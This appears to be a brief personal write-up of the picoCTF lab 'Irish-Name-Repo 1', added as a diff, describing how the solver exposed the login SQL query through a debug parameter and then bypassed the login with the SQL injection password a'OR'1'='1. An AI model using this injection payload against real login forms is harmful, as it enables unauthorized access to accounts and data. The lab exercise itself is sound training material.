@@ -1,0 +1,36 @@
+Title: Irish-Name-Repo 1
+
+Do you think you can log us in? Try to see if you can login!
+
+link used:
+http://fickle-tempest.picoctf.net:60670
+
+Hint:
+There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
+Try to think about how the website verifies your login.
+
+Method used:
+SQL injection
+
+History;
+
+Username: admin
+Password: a
+-Login Failed-
+F12 and check Network
+check payload in login.php
+copy cURL(Bash)
+tweak "username=admin&password=a&debug=0" to debug=1
+Replied with //SQL query: SELECT * FROM users WHERE name='admin' AND password='a'//
+
+Return back to Login Page
+Modify my Password: a'OR'1'='1
+
+##
+https://www.w3schools.com/sql/sql_injection.asp
+
+###
+Basically the Password is always true, thus bypassing the restriction
+
+Code:
+picoCTF{s0m3_SQL...}
